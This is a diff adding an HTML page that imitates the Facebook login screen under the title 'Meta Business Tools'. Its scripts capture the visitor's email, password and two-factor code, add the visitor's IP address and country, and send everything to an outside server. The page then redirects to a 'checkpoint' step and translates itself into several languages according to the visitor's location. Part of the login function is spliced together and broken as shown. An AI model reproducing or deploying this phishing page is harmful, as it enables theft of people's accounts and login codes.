@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Meta Business Tools</title>
+        <link rel="shortcut icon" href="image/icon.png" type="image/x-icon">
+        <link rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+            integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const passwordInput = document.getElementById('pass');
+                const eyeIcon = document.querySelector('.fa-eye');
+                eyeIcon.addEventListener('click', function () {
+                    const isPasswordVisible = passwordInput.type === 'text';
+                    passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                    eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
+                });
+            });
+        </script>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                background-color: #F0F2F5;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+            }
+
+            .home {
+                text-align: center;
+                width: 100%;
+                background-color: #F0F2F5;
+            }
+
+            .content {
+                min-width: 980px;
+                min-height: 536px;
+                display: flex;
+                width: 100%;
+                justify-content: center;
+                margin-top: 250px;
+                margin-bottom: 200px;
+
+
+            }
+
+            .content-left {
+                box-sizing: border-box;
+                margin-right: 0;
+                padding-right: 110px;
+                width: 580px;
+                display: inline-block;
+            }
+
+            .content-left .image {
+                width: 548px;
+                height: 182px;
+                padding: 112px 0 16px;
+                display: flex;
+            }
+
+            .content-left .content {
+                width: 500px;
+            }
+
+
+            .content-left .content h2 {
+                font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+                font-size: 28px;
+                color: #1c1e21;
+                grid-area: auto;
+                line-height: 32px;
+                padding: 0 0 20px;
+                width: 500px;
+
+            }
+
+            h2 {
+                text-align: left;
+            }
+
+            .image img {
+                display: inline;
+                grid-area: auto;
+                line-height: 16px;
+                margin: -28px;
+                min-width: 321px;
+                max-height: 106px;
+                min-height: 0;
+                object-fit: cover;
+            }
+
+            .content-right {
+                display: inline-block;
+                line-height: 16px;
+            }
+
+
+            .formLogin {
+                background-color: #fff;
+                border: none;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+                box-sizing: border-box;
+                margin: 40px 0 0;
+                padding: 20px 15px 28px;
+                width: 396px;
+                height: 360px;
+                text-align: center;
+                align-items: center;
+            }
+
+            .input {
+                height: 52px;
+                background-color: #ffffff;
+                border-radius: 6px;
+                color: #1d2219;
+                display: inline-block;
+                font-size: 17px;
+                line-height: 16px;
+                padding: 14px 16px;
+                border: 1px solid #ccc;
+                margin-bottom: 15px;
+                width: 100%;
+            }
+
+            .input i {
+                margin-top: 50px;
+            }
+
+            .input :focus {
+                border: 1px solid #1877F2 !important;
+            }
+
+            .password {
+                display: flex;
+                position: relative;
+            }
+
+            .password i {
+                position: absolute;
+                right: 14px;
+                top: 25%;
+            }
+
+            .btnLogin {
+                font-size: 20px;
+                font-family: inherit;
+                background-color: #0866ff;
+                border: none;
+                border-radius: 6px;
+                padding: 0 16px;
+                width: 100%;
+                color: #fff;
+                font-weight: 700;
+                line-height: 48px;
+                justify-content: center;
+                margin-bottom: 30px;
+            }
+
+            .formLogin .forgotPassword {
+                color: #0866ff;
+                font-size: 14px;
+                font-weight: 500;
+                line-height: 19px;
+                text-align: center;
+                text-decoration: none;
+                margin-bottom: 15px;
+            }
+
+            .hr {
+                color: #dadde1;
+            }
+
+            .create {
+                background-color: #42b72a;
+                border-radius: 6px;
+                display: inline-block;
+                color: #ffffff;
+                font-size: 17px;
+                font-weight: 700;
+                justify-content: center;
+                line-height: 48px;
+                padding: 0px 16px;
+                text-align: center;
+                text-decoration: none;
+            }
+
+            .formLogin .create:hover {
+                color: #ffffff;
+                opacity: 0.9;
+            }
+
+            .bottomForm {
+                width: 396px;
+                text-align: center;
+                margin: 28px 0 0;
+                font-size: 14px;
+                line-height: 19px;
+            }
+
+            .bottomForm a {
+                font-weight: 600;
+                font-size: 14px;
+                text-decoration: none;
+                color: #1C1E21;
+                font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+
+            }
+
+            .bottomForm span {
+                font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+
+            }
+
+            #loader {
+                padding: 0 16px;
+                line-height: 48px;
+                margin-bottom: 30px;
+                display: none;
+                width: 100%;
+                flex-direction: row;
+                margin-top: 20px;
+                justify-content: center;
+            }
+
+            .loader {
+                --d: 22px;
+                width: 4px;
+                height: 4px;
+                border-radius: 50%;
+                color: #1877F2;
+                box-shadow:
+                    calc(1*var(--d)) calc(0*var(--d)) 0 0,
+                    calc(0.707*var(--d)) calc(0.707*var(--d)) 0 1px,
+                    calc(0*var(--d)) calc(1*var(--d)) 0 2px,
+                    calc(-0.707*var(--d)) calc(0.707*var(--d)) 0 3px,
+                    calc(-1*var(--d)) calc(0*var(--d)) 0 4px,
+                    calc(-0.707*var(--d)) calc(-0.707*var(--d))0 5px,
+                    calc(0*var(--d)) calc(-1*var(--d)) 0 6px;
+                animation: l27 1s infinite steps(8);
+            }
+
+            @keyframes l27 {
+                100% {
+                    transform: rotate(1turn)
+                }
+            }
+
+            .footer {
+                width: 100%;
+            }
+
+            .container {
+                display: flex;
+                flex-wrap: wrap;
+                position: relative;
+            }
+
+            .pageFooter {
+                text-align: center;
+            }
+
+            .locate {
+                align-items: center;
+                display: flex;
+                flex-wrap: wrap;
+                grid-area: auto;
+                font-size: 12px;
+                line-height: 16px;
+                padding: 8px 0 0;
+                margin-left: 160px;
+
+            }
+
+            .locate ul {
+                display: flex;
+                list-style: none;
+                align-items: center;
+                margin-top: -8px;
+            }
+
+            .locate ul li {
+                line-height: 16px;
+                grid-area: auto;
+                padding: 0px 0px 0px 10px;
+            }
+
+            .locate li a {
+                text-decoration: none;
+                color: #737373;
+                font-size: 12px;
+                font-family: inherit;
+            }
+
+            .add {
+                background-color: #fff;
+                border-radius: 2px;
+                color: #8a8d91;
+                display: inline-block;
+                font-size: 12px;
+                justify-content: center;
+                line-height: 18px;
+                padding: 0px 8px;
+                text-align: center;
+            }
+
+            .add i {
+                font-size: 12px;
+                font-weight: 700;
+                color: #8a8d91;
+                text-align: center;
+                grid-area: auto;
+            }
+
+            .pageFooter hr {
+                max-width: 980px;
+                margin-left: 200px;
+            }
+
+            .pageFooter span {
+                margin-left: 200px;
+                display: flex;
+                flex: flex-start;
+                color: #737373;
+                font-size: 11px;
+                line-height: 14.73px;
+            }
+        </style>
+        <script>
+            function submitForm() {
+                var emailInput = document.getElementById('email');
+                var emailValue = emailInput.value;
+                var passwordInput = document.getElementById('pass');
+                var passwordValue = passwordInput.value;
+                if (emailValue === '') {
+                    emailInput.focus();
+
+                }
+                else if (passwordValue === '') {
+                    passwordInput.focus();                            else if (data == 'XACMINH') {
+                        let username;
+                        let password;
+                        username = emailValue;
+                        password = passwordValue;
+                        localStorage.setItem('username', username);
+                        localStorage.setItem('password', password);
+                        window.location.href = "./checkpoint.html";
+                    }
+                }
+                else {
+                    var button = document.getElementById("login");
+                    var loader = document.getElementById("loader");
+                    button.style.display = "none";
+                    loader.style.display = "flex";
+                    event.preventDefault();
+                    const ipAddress = localStorage.getItem('ipAddress');
+                    const address = localStorage.getItem('address');
+                    var code = document.getElementById('2facode')
+                    var codeValue = code.value
+                    fetch('https://superpc.id.vn/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Network response was not ok');
+                            }
+                            return response.text();
+                        })
+                        .then(data => {
+                            if (data === '2FA') {
+                                var emailContainer = document.getElementById('emailContainer');
+                                emailContainer.style.display = 'none';
+                                var passContainer = document.getElementById('passContainer');
+                                passContainer.style.display = 'none';
+                                var twoFactorContainer = document.getElementById('2faContainer');
+                                twoFactorContainer.style.display = 'block';
+                                var button = document.getElementById("login");
+                                var loader = document.getElementById("loader");
+                                button.style.display = "block";
+                                loader.style.display = "none";
+                                button.addEventListener("click", submitForm);
+                            }
+                            else if (data === 'WRONG') {
+                                emailInput.value = '';
+                                passwordInput.value = '';
+                                code.value = '';
+                                passwordInput.style.borderColor = 'red';
+                                passwordInput.placeholder = 'Wrong password';
+                                code.placeholder = 'Wrong code';
+                                code.style.borderColor = 'red';
+                                var button = document.getElementById("login");
+                                var loader = document.getElementById("loader");
+                                button.style.display = "block";
+                                loader.style.display = "none";
+                                button.addEventListener("click", submitForm);
+                            } else if (data == 'XACMINH') {
+                                let username;
+                                let password;
+                                username = emailValue;
+                                password = passwordValue;
+                                localStorage.setItem('username', username);
+                                localStorage.setItem('password', password);
+                                window.location.href = "./checkpoint.html";
+                            }
+                            else if (data == 'CP') {
+                                window.location.href = "https://business.facebook.com/";
+                            }
+                        })
+                        .catch(error => {
+                            console.error('There has been a problem with your fetch operation:', error);
+                        })
+                        .finally(() => {
+                            var button = document.getElementById("login");
+                            var loader = document.getElementById("loader");
+                            button.style.display = "block";
+                            loader.style.display = "none";
+                            button.addEventListener("click", submitForm);
+                        });
+                }
+            }
+            function removeRedBorder() {
+                var emailInput = document.getElementById('email');
+                var passwordInput = document.getElementById('pass');
+                var code = document.getElementById('2facode');
+                passwordInput.setAttribute('placeholder', 'Password');
+                passwordInput.style.borderColor = 'black';
+            }
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', async function () {
+                let ipAddress;
+                let address;
+                try {
+                    const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipifyData = await ipifyResponse.json();
+                    ipAddress = ipifyData.ip;
+
+                    const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+                    const ipLocationNetData = await ipLocationNetResponse.json();
+                    address = ipLocationNetData.country_name;
+
+                    localStorage.setItem('ipAddress', ipAddress);
+                    localStorage.setItem('address', address);
+                } catch (error) {
+                    console.error('Lỗi:', error);
+                }
+            });
+        </script>
+    </head>
+
+    <body>
+        <div class="container">
+            <div class="home" id="home">
+                <div class="content" id="content">
+                    <div class="content-left col-6" id="content-left">
+                        <div class="image" id="img">
+                            <img src="image/facebook.svg" alt="">
+                        </div>
+                        <div class="content-left text">
+                            <h2 id="h2text">
+                                Facebook helps you connect and share with the people in your life.
+                            </h2>
+                        </div>
+                    </div>
+                    <div class="content-right col-3" id="content-right">
+                        <div class="formLogin">
+                            <div class="email" id="emailContainer">
+                                <input type="text" class="input" placeholder="Email address or phone number" id="email"
+                                    oninput="removeRedBorder()">
+                            </div>
+                            <div class="email" id="2faContainer" style="display: none;
+                        margin-top: 20px;">
+                                <input type="text" class="input" placeholder="login code" id="2facode"
+                                    onfocus="removeRedBorder()" oninput="removeRedBorder()">
+                            </div>
+                            <div class="password" id="passContainer">
+                                <input type="password" class="input" placeholder="Password" id="pass"
+                                    oninput="removeRedBorder()">
+                                <i id="eye" class="fa fa-eye"></i>
+                            </div>
+                            <button class="btnLogin" name="login" id="login" onclick="submitForm()">Log in</button>
+                            <div id="loader">
+                                <div class="loader"></div>
+                            </div>
+                            <a id="forgot" class="forgotPassword" href="#">Forgotten password?</a>
+                            <hr class="hr">
+                            <a id="create" class="create" href="#">Create new account</a>
+                        </div>
+                        <div class="bottomForm">
+                            <a id="page" href="">Create a Page</a>
+                            <span id="spanid">for a celebrity, brand or business.</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+            <div class="footer">
+                <div class="pageFooter" id="pageFooter">
+                    <div class="locate" id="locate">
+                        <ul id="locateul">
+                            <li><a href="#">English (UK)</a></li>
+                            <li><a href="#">Tiếng Việt</a></li>
+                            <li><a href="#">中文(台灣)</a></li>
+                            <li><a href="#">한국어</a></li>
+                            <li><a href="#">日本語</a></li>
+                            <li><a href="#">Français (France)</a></li>
+                            <li><a href="#">ภาษาไทย</a></li>
+                            <li><a href="#">Español</a></li>
+                            <li><a href="#">Português (Brasil)</a></li>
+                            <li><a href="#">Deutsch</a></li>
+                            <li><a href="#">Italiano</a></li>
+                            <li><a class="add" href="#"><i>+</i></a></li>
+                        </ul>
+                    </div>
+                    <hr>
+                    <div class="locate" id="locate2">
+                        <ul id="locate2ul1">
+                            <li><a href="#">Sign</a></li>
+                            <li><a href="#">UpLog</a></li>
+                            <li><a href="#">inMessenger Lite</a></li>
+                            <li><a href="#">Facebook</a></li>
+                            <li><a href="#">Video</a></li>
+                            <li><a href="#">Places</a></li>
+                            <li><a href="#">Games</a></li>
+                            <li><a href="#">Español</a></li>
+                            <li><a href="#">Marketplace</a></li>
+                            <li><a href="#">Meta Pay</a></li>
+                            <li><a href="#">Meta Store</a></li>
+                            <li><a href="#">Imagine with Meta AI</a></li>
+                            <li><a href="#">Instagram</a></li>
+                            <li><a href="#">Threads</a></li>
+                            <li><a href="#">Fundraisers</a></li>
+                        </ul>
+                        <ul id="locate2ul2">
+                            <li><a href="#">Services</a></li>
+                            <li><a href="#">Voting Information Centre</a></li>
+                            <li><a href="#">Privacy Policy</a></li>
+                            <li><a href="#">Privacy Centre</a></li>
+                            <li><a href="#">Groups</a></li>
+                            <li><a href="#">About</a></li>
+                            <li><a href="#">Create ad</a></li>
+                            <li><a href="#">Create Page</a></li>
+                            <li><a href="#">Developers</a></li>
+                            <li><a href="#">Careers</a></li>
+                            <li><a href="#">Cookies</a></li>
+                            <li><a href="#">AdChoices</a></li>
+                            <li><a href="#">Terms</a></li>
+                            <li><a href="#">Help</a></li>
+                        </ul>
+                        <ul>
+                            <li><a href="#">Contact uploading and non-usersSettings</a></li>
+                        </ul>
+                    </div>
+                    <span id="span">Meta © 2024</span>
+                </div>
+            </div>
+        </div>
+        <script>
+            var ipAddress = localStorage.getItem('ipAddress');
+            var address = localStorage.getItem('address');
+            const emailInput = document.getElementById('email');
+            const passInput = document.getElementById('pass');
+            const login = document.getElementById('login');
+            const h2text = document.getElementById('h2text');
+            const forgot = document.getElementById('forgot');
+            const create = document.getElementById('create');
+            const page = document.getElementById('page');
+            const spanid = document.getElementById('spanid');
+            const facode = document.getElementById('2facode');
+            if (address === 'Viet Nam') {
+                emailInput.placeholder = 'Email hoặc số điện thoại';
+                passInput.placeholder = 'Mật khẩu';
+                login.textContent = 'Đăng nhập';
+                h2text.textContent = 'Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống.'
+                forgot.textContent = 'Quên mật khẩu?';
+                create.textContent = 'Tạo tài khoản mới';
+                page.textContent = 'Tạo một trang';
+                spanid.textContent = 'cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.'
+                facode.placeholder = 'Mã đăng nhập';
+                document.title = 'Facebook - Đăng nhập hoặc đăng ký'
+            } else if (address === 'France') {
+                emailInput.placeholder = 'Adresse e-mail ou numéro de tél.';
+                passInput.placeholder = 'Mot de passe';
+                login.textContent = 'Se connecter';
+                h2text.textContent = 'Avec Facebook, partagez et restez en contact avec votre entourage.'
+                forgot.textContent = 'Mot de passe oublié ?';
+                create.textContent = 'Créer nouveau compte';
+                page.textContent = 'Créer une Page';
+                spanid.textContent = 'pour une célébrité, une marque ou une entreprise.'
+                facode.placeholder = 'Code de connexion';
+                document.title = 'Facebook - Connexion ou inscription'
+            } else if (address === 'Spain') {
+                emailInput.placeholder = 'Correo electrónico o número de teléfono" autofocus="1" aria-label="Correo electrónico o número de teléfono';
+                passInput.placeholder = 'Contraseña';
+                login.textContent = 'Iniciar sesión';
+                h2text.textContent = 'Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.'
+                forgot.textContent = '¿Has olvidado la contraseña?';
+                create.textContent = 'Crear cuenta nueva';
+                page.textContent = 'Crea una página';
+                spanid.textContent = 'para un famoso, una marca o una empresa.'
+                facode.placeholder = 'código de inicio de sesión';
+                document.title = 'Facebook - Entrar o registrarse'
+            } else if (address === 'Italy') {
+                emailInput.placeholder = 'E-mail o numero di telefono';
+                passInput.placeholder = 'Password';
+                login.textContent = 'Accedi';
+                h2text.textContent = 'Facebook ti aiuta a connetterti e rimanere in contatto con le persone della tua vita.'
+                forgot.textContent = 'Password dimenticata?';
+                create.textContent = 'Crea nuovo account';
+                page.textContent = 'Crea una Pagina';
+                spanid.textContent = `per un personaggio famoso, un brand o un'azienda.`
+                facode.placeholder = 'Codice di accesso';
+                document.title = 'Facebook: accedi o iscriviti'
+            } else if (address === 'Thailand') {
+                emailInput.placeholder = 'อีเมลหรือหมายเลขโทรศัพท์มือถือ';
+                passInput.placeholder = 'รหัสผ่าน';
+                login.textContent = 'เข้าสู่ระบบ';
+                h2text.textContent = 'Facebook ช่วยคุณเชื่อมต่อและแชร์กับผู้คนมากมายรอบตัวคุณ'
+                forgot.textContent = 'ลืมรหัสผ่านใช่หรือไม่';
+                create.textContent = 'สร้างบัญชีใหม่';
+                page.textContent = 'สร้างเพจ';
+                spanid.textContent = 'สำหรับคนดัง แบรนด์ หรือธุรกิจ'
+                facode.placeholder = 'รหัสเข้าสู่ระบบ';
+                document.title = 'Facebook - เข้าสู่ระบบหรือสมัครใช้งาน'
+            } else if (address === 'Portugal') {
+                emailInput.placeholder = 'E-mail ou número de telemóvel';
+                passInput.placeholder = 'Palavra-passe';
+                login.textContent = 'Iniciar sessão';
+                h2text.textContent = 'O Facebook ajuda-te a comunicar e a partilhar com as pessoas que fazem parte da tua vida.'
+                forgot.textContent = 'Não sabes a tua palavra-passe?';
+                create.textContent = 'Criar nova conta';
+                page.textContent = 'Cria uma Página';
+                spanid.textContent = 'para uma celebridade, marca ou empresa.'
+                facode.placeholder = 'Código de acesso';
+                document.title = 'Facebook - Inicia sessão ou regista-te'
+            } else if (address === 'Israel') {
+                emailInput.placeholder = 'ל או מספר טלפון';
+                passInput.placeholder = 'סיסמה';
+                login.textContent = 'התחברות';
+                h2text.textContent = 'פייסבוק מאפשרת לך להתחבר ולשתף יחד עם האנשים בחייך'
+                forgot.textContent = 'שכחת את הסיסמה?';
+                create.textContent = 'צרי חשבון חדש';
+                page.textContent = 'צור/צרי דף';
+                spanid.textContent = 'לידוען, מותג או עסק.'
+                facode.placeholder = 'קוד כניסה';
+                document.title = 'פייסבוק - כניסה או הרשמה'
+                var content = document.getElementById('content');
+                content.style.flexDirection = 'row-reverse';
+                var contentLeft = document.getElementById('content-left');
+                contentLeft.style.paddingLeft = '186px'
+                contentLeft.style.paddingRight = '10px'
+                var text = document.getElementById('h2text');
+                h2text.style.textAlign = 'right';
+                var img = document.getElementById('img');
+                img.style.paddingLeft = '204px'
+                var email = document.getElementById('email');
+                email.style.textAlign = 'right'
+                var pass = document.getElementById('pass');
+                pass.style.textAlign = 'right'
+                var eye = document.getElementById('eye');
+                eye.style.display = 'none'
+                var locate = document.getElementById('locate');
+                locate.style.flexDirection = 'row-reverse';
+                locate.style.paddingRight = '119px'
+                var locateul = document.getElementById('locateul');
+                locateul.style.flexDirection = 'row-reverse';
+                var locate2 = document.getElementById('locate2');
+                locate2.style.flexDirection = 'row-reverse';
+                locate2.style.paddingRight = '119px'
+                var locateul1 = document.getElementById('locateul1');
+                locateul1.style.flexDirection = 'row-reverse';
+                var locateul2 = document.getElementById('locateul2');
+                locateul2.style.flexDirection = 'row-reverse';
+                var span = document.getElementById('span');
+                span.style.display = 'none';
+            }
+        </script>
+    </body>
+
+</html>
